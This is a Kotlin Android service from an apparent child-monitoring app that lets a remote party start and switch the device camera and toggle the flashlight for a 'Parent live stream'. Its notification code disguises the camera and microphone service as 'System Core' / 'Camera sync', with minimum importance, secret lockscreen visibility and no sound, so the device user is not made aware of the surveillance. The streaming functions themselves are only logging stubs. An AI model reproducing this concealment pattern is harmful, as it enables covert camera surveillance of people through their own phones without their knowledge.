package com.vyra.kids.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.vyra.kids.core.AppConstants

class RemoteCameraStreamService : Service() {

    private var cameraManager: CameraManager? = null
    private var isTorchOn = false

    companion object {
        const val ACTION_START_CAMERA = "com.vyra.kids.START_CAMERA"
        const val ACTION_STOP_CAMERA = "com.vyra.kids.STOP_CAMERA"
        const val ACTION_SWITCH_CAMERA = "com.vyra.kids.SWITCH_CAMERA"
        const val ACTION_TOGGLE_TORCH = "com.vyra.kids.TOGGLE_TORCH"
        const val EXTRA_CAMERA_FACING = "camera_facing" // "front" or "back"
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_CAMERA -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    startForeground(
                        AppConstants.SERVICE_NOTIFICATION_ID + 2,
                        createCameraNotification(),
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    )
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(
                        AppConstants.SERVICE_NOTIFICATION_ID + 2,
                        createCameraNotification(),
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                    )
                } else {
                    startForeground(AppConstants.SERVICE_NOTIFICATION_ID + 2, createCameraNotification())
                }
                val facing = intent.getStringExtra(EXTRA_CAMERA_FACING) ?: "back"
                startCameraStream(facing)
            }
            ACTION_STOP_CAMERA -> {
                stopCameraStream()
                stopSelf()
            }
            ACTION_SWITCH_CAMERA -> {
                val facing = intent.getStringExtra(EXTRA_CAMERA_FACING) ?: "back"
                switchCamera(facing)
            }
            ACTION_TOGGLE_TORCH -> {
                toggleFlashlight()
            }
        }
        return START_NOT_STICKY
    }

    private fun createCameraNotification(): Notification {
        val channelId = "vyra_camera_streaming"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Core",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Core")
            .setContentText("Camera sync")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(true)
            .build()
    }

    private fun startCameraStream(facing: String) {
        Log.i(AppConstants.TAG, "Starting Remote Camera ($facing) for Parent live stream via Camera2 API")
    }

    private fun switchCamera(newFacing: String) {
        Log.i(AppConstants.TAG, "Switched camera lens to: $newFacing")
    }

    private fun toggleFlashlight() {
        try {
            val cm = cameraManager ?: return
            val backCameraId = cm.cameraIdList.firstOrNull { id ->
                val chars = cm.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
            }
            if (backCameraId != null) {
                isTorchOn = !isTorchOn
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    cm.setTorchMode(backCameraId, isTorchOn)
                    Log.i(AppConstants.TAG, "Flashlight set to: $isTorchOn")
                }
            }
        } catch (e: CameraAccessException) {
            Log.e(AppConstants.TAG, "Error toggling torch", e)
        }
    }

    private fun stopCameraStream() {
        Log.i(AppConstants.TAG, "Remote camera stream closed")
    }

    override fun onDestroy() {
        if (isTorchOn) toggleFlashlight()
        stopCameraStream()
        super.onDestroy()
    }
}
